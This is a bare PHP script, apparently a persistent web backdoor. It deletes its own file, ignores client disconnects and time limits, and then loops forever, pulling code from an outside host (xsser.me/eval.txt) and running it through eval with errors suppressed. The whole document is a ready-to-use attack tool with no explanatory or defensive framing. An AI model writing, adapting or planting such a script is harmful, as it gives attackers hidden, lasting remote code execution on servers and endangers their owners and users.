<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

$remote_file = 'http://xsser.me/eval.txt';
while($code = file_get_contents($remote_file)){
  @eval($code);
  sleep(5);
};
?>